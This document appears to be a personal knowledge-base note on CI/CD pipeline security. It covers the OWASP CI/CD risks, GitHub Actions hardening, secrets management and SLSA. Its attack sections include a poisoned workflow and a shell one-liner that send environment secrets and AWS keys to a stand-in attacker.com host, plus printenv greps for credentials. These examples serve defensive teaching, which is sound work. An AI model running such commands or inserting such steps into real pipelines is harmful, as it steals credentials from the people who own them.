---
type: monograph
room: green
subject: "CI/CD Pipeline Security"
tags: [green/cloud, green/cicd, green/devsecops]
date_updated: {{date}}
---

# Cloud — CI/CD Pipeline Security

> [!quote]
> *"The little things are infinitely the most important."* — The build pipeline is the most trusted path in your environment.

**Reference:** OWASP Top 10 CI/CD Security Risks | SLSA Framework | **Phase:** Protect

CI/CD pipelines have direct write access to production. A compromised pipeline is a direct path from a pull request to production infrastructure. This monograph covers attack techniques and defences across GitHub Actions, GitLab CI, and general pipeline hygiene.

---

## OWASP Top 10 CI/CD Risks

| Rank | Risk | Example |
|------|------|---------|
| CICD-SEC-01 | Insufficient Flow Control | PR from fork triggers deployment |
| CICD-SEC-02 | Inadequate Identity & Access | Shared service accounts, no MFA |
| CICD-SEC-03 | Dependency Chain Abuse | Typosquatted npm package |
| CICD-SEC-04 | Poisoned Pipeline Execution (PPE) | Attacker modifies pipeline YAML via PR |
| CICD-SEC-05 | Insufficient PBAC | Pipeline has admin perms it doesn't need |
| CICD-SEC-06 | Insufficient Credential Hygiene | Secrets in env vars logged to console |
| CICD-SEC-07 | Insecure System Config | Self-hosted runner with root access |
| CICD-SEC-08 | Ungoverned Usage of 3rd Party Services | Actions from unverified GitHub orgs |
| CICD-SEC-09 | Improper Artefact Integrity | No image signing, no SBOM verification |
| CICD-SEC-10 | Insufficient Logging & Visibility | No audit trail of pipeline changes |

---

## Attack: Poisoned Pipeline Execution (PPE)

An attacker submits a PR that modifies the pipeline definition file to exfiltrate secrets or deploy malicious code.

```yaml
# Attacker-modified .github/workflows/build.yml in a fork PR
on:
  pull_request:         # ← triggers on fork PRs = attacker controlled
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Exfil secrets
        run: |
          curl -X POST https://attacker.com/steal \
            -d "AWS_KEY=${{ secrets.AWS_ACCESS_KEY_ID }}&token=${{ github.token }}"
```

**Fix:**
```yaml
# Use pull_request_target only for trusted PRs, or restrict secrets:
on:
  pull_request_target:
    types: [labeled]       # only trigger when maintainer adds 'safe to test' label
jobs:
  build:
    if: contains(github.event.pull_request.labels.*.name, 'safe to test')
    permissions:
      contents: read       # minimal permissions
```

---

## Attack: Secrets Extraction from CI

```bash
# Look for secrets in pipeline logs (poorly masked)
# Search GitHub Actions run logs for accidental prints

# Exfil via environment
env | base64 | curl -X POST https://attacker.com/steal -d @-

# From inside a build step (if attacker controls code):
# GitHub Actions — access all secrets
printenv | grep -i "secret\|token\|key\|password"

# GitLab CI — CI variables
env | grep "CI_\|GL_\|REGISTRY"
```

---

## Attack: Dependency Confusion / Typosquatting

```bash
# An internal package "company-utils" is resolved from public npm before private registry
# Attacker publishes "company-utils" to public npm with higher version
# CI installs attacker's package automatically

# Detection — check where packages are being resolved
npm config get registry
pip config get global.index-url

# Mitigate — pin all dependencies with lockfiles + hash verification
npm ci                     # uses package-lock.json exactly
pip install --require-hashes -r requirements.txt
```

---

## GitHub Actions — Hardening

```yaml
# 1. Pin actions to commit SHA (not tag — tags can move)
# BAD:
- uses: actions/checkout@v3
# GOOD:
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

# 2. Minimal permissions
permissions:
  contents: read
  id-token: write          # only if OIDC auth needed

# 3. Never print secrets
# BAD:
- run: echo "Key is ${{ secrets.AWS_KEY }}"
# GOOD:
- run: aws sts get-caller-identity  # use secret without echoing

# 4. Restrict environment access
jobs:
  deploy:
    environment: production       # requires reviewer approval
    if: github.ref == 'refs/heads/main'

# 5. OIDC — use short-lived cloud credentials instead of stored keys
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
    aws-region: us-east-1
    # No AWS_ACCESS_KEY_ID needed — uses OIDC token
```

---

## Secrets Management in Pipelines

```bash
# BAD — secret as environment variable (can be logged, leaked)
env:
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
run: echo $DB_PASSWORD  # ← accidentally printed

# BETTER — fetch at runtime from secrets manager (never stored in env)
run: |
  SECRET=$(aws secretsmanager get-secret-value \
    --secret-id prod/db/password \
    --query SecretString --output text)
  # Use SECRET inline, never print

# BEST — inject via OIDC + secrets manager, no long-lived keys
```

**Secret Scanning in CI:**
```yaml
# GitHub Actions — scan for secrets on every push
- name: Scan for secrets
  uses: trufflesecurity/trufflehog@main
  with:
    path: ./
    base: ${{ github.event.repository.default_branch }}

# gitleaks as pre-commit hook
gitleaks protect --staged   # local, before push
gitleaks detect --source . --report-path gitleaks-report.json  # in CI
```

---

## Pipeline Security Checklist

```markdown
### Source Control
☐ Branch protection rules — no direct push to main
☐ Required PR reviews (≥1 reviewer, include security team for pipeline changes)
☐ CODEOWNERS for pipeline files (.github/workflows, .gitlab-ci.yml)
☐ Secret scanning enabled (GitHub Advanced Security, GitGuardian)

### Pipeline Configuration
☐ Pin all third-party actions/orbs to commit SHA
☐ Minimal permissions per job (principle of least privilege)
☐ No secrets stored in pipeline YAML — use encrypted secrets/vault
☐ Separate pipelines for build vs. deploy — deploy requires approval
☐ Self-hosted runners: isolated, ephemeral, not running as root

### Artefact Integrity (SLSA)
☐ Build provenance generated and signed (SLSA Level 2+)
☐ Container images signed with Sigstore/Cosign
☐ Dependency lockfiles committed and verified (npm ci, pip --require-hashes)
☐ SBOM generated at build time

### Credentials
☐ Use OIDC federation instead of long-lived access keys
☐ Secrets masked in logs (CI platform default + explicit ::add-mask::)
☐ Rotate secrets quarterly — revoke immediately on suspected exposure
☐ No secrets in Dockerfiles, docker-compose, or helm values

### Audit & Monitoring
☐ Pipeline change audit log retained ≥90 days
☐ Alert on: new workflow files, changes to deploy pipelines, new secrets added
☐ Failed/anomalous build alerting
```

---

## SLSA Framework (Supply Chain Levels)

| Level | Requirements | What It Provides |
|-------|-------------|-----------------|
| SLSA 0 | None | No guarantees |
| SLSA 1 | Build process documented | Basic provenance |
| SLSA 2 | Authenticated provenance from hosted CI | Tamper evidence |
| SLSA 3 | Hardened build platform (isolated, ephemeral) | Strong build integrity |
| SLSA 4 | Two-person review + hermetic builds | Highest assurance |

```bash
# Generate SLSA provenance with slsa-github-generator
- uses: slsa-framework/slsa-github-generator/.github/workflows/builder_go_slsa3.yml@v1.9.0
  with:
    go-version: '1.21'

# Verify provenance before deployment
slsa-verifier verify-artifact myapp.tar.gz \
  --provenance-path myapp.tar.gz.intoto.jsonl \
  --source-uri github.com/myorg/myrepo
```

---

## Related Notes

- [[Cloud - Container Security]] ← Securing what the pipeline builds and deploys
- [[Cloud - AWS Security]] ← OIDC for AWS credentials in GitHub Actions
- [[AppSec - Secure Code Review]] ← Static analysis in the pipeline
- [[Green - Instruments]] ← checkov, trivy, Prowler

↩ [[Green - Monographs]] · [[Green]] · [[Mind Palace]]
